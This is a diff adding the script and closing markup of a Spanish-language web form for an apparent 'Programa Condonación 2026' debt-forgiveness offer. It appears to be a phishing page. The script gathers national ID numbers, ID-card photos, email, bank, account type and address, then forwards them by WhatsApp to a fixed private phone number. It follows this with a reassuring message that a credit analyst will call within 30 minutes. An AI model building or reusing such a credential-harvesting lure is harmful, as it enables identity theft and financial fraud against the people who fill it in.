+        alertContainer.innerHTML = '<div class="alert alert-error">❌ Debes subir las fotos frontal y reverso de tu cédula.</div>';
+        return;
+      }
+
+      // VALIDAR EMAIL
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        alertContainer.innerHTML = '<div class="alert alert-error">❌ Ingresa un correo electrónico válido.</div>';
+        return;
+      }
+
+      // VALIDAR CEDULA
+      if (!/^\d{10}$/.test(cedula)) {
+        alertContainer.innerHTML = '<div class="alert alert-error">❌ La cédula debe tener 10 dígitos.</div>';
+        return;
+      }
+
+      // CONSTRUIR MENSAJE
+      const mensaje = `🔐 *SOLICITUD PROGRAMA CONDONACIÓN 2026* 🔐%0A%0A` +
+        `*Datos Personales:*%0A` +
+        `📝 Nombre: ${encodeURIComponent(nombre)}%0A` +
+        `🆔 Cédula: ${cedula}%0A` +
+        `📧 Email: ${encodeURIComponent(email)}%0A` +
+        `🏦 Banco: ${encodeURIComponent(banco)}%0A` +
+        `💳 Tipo Cuenta: ${tipoCuenta}%0A` +
+        `🏠 Dirección: ${encodeURIComponent(direccion)}%0A%0A` +
+        `*Información Financiera:*%0A` +
+        `📊 Plan Contratado: ${plan}%0A%0A` +
+        `⚠️ *Las fotos de cédula deben ser enviadas por separado o compartidas a este chat.*%0A%0A` +
+        `✅ Solicitud completada. El equipo de crédito revisará tu información.`;
+
+      // MOSTRAR CONFIRMACIÓN
+      alertContainer.innerHTML = '<div class="alert alert-success">✅ Enviando solicitud...</div>';
+
+      // REDIRIGIR A WHATSAPP
+      setTimeout(() => {
+        window.open(`https://wa.me/593963144434?text=${mensaje}`, '_blank');
+        
+        // RESETEAR FORMULARIO
+        setTimeout(() => {
+          document.getElementById('condonacionForm').reset();
+          alertContainer.innerHTML = '<div class="alert alert-success">✅ Solicitud enviada correctamente. El analista de crédito te contactará en máximo 30 minutos.</div>';
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        }, 1000);
+      }, 500);
+    });
+
+    // VALIDAR ARCHIVOS
+    document.getElementById('cedulaFrontal').addEventListener('change', function(e) {
+      validateFile(e.target);
+    });
+
+    document.getElementById('cedulaReverso').addEventListener('change', function(e) {
+      validateFile(e.target);
+    });
+
+    function validateFile(input) {
+      const file = input.files[0];
+      const maxSize = 5 * 1024 * 1024; // 5MB
+
+      if (file && file.size > maxSize) {
+        alert('El archivo es demasiado grande. Máximo 5MB.');
+        input.value = '';
+      }
+    }
+
+    // FORMATEAR CEDULA
+    document.getElementById('cedula').addEventListener('input', function(e) {
+      this.value = this.value.replace(/\D/g, '');
+    });
+
+    // FORMATEAR NUMERO DE CUENTA
+    document.getElementById('numeroCuenta').addEventListener('input', function(e) {
+      this.value = this.value.replace(/\D/g, '');
+    });
+  </script>
+
+</body>
+</html>
